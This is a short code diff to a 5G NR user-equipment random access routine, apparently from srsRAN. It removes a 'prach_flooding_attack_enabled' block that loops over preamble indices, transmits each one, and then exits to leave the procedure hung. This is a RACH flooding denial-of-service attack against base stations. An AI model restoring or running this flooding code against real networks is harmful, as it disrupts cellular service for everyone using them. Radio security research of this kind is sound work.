@@ -188,24 +188,6 @@ void proc_ra_nr::ra_preamble_transmission()
 
   prach_occasion = 0;
 
-  if (rach_cfg.prach_flooding_attack_enabled) {
-    srsran::console("Starting RACH flood: (NofPreambles=%d)\n", rach_cfg.nof_preambles);
-    // Send a random access preamble with every available index
-    rach_cfg.nof_preambles = rach_cfg.nof_preambles > 0 ? rach_cfg.nof_preambles : 7;
-    for (uint16_t current_preamble = 0; current_preamble < rach_cfg.nof_preambles; current_preamble++) {
-      srsran::console("Sending ra preamble (Occasion=%d, Index=%d, TargetPower=%d)\n",
-                      0,
-                      current_preamble,
-                      preamble_received_target_power);
-      phy->send_prach(0, current_preamble, preamble_received_target_power);
-      // Wait for each message to be send
-      prach_send_timer.set(PRACH_SEND_CALLBACK_TIMEOUT, [this](uint32_t tid) { timer_expired(tid); });
-      prach_send_timer.run();
-    }
-    // HACK: Exit so that the prach is hung
-    exit(0);
-  }
-
   // instruct the physical layer to transmit the Random Access Preamble using the selected PRACH occasion, corresponding
   // RA-RNTI (if available), PREAMBLE_INDEX, and PREAMBLE_RECEIVED_TARGET_POWER.
 
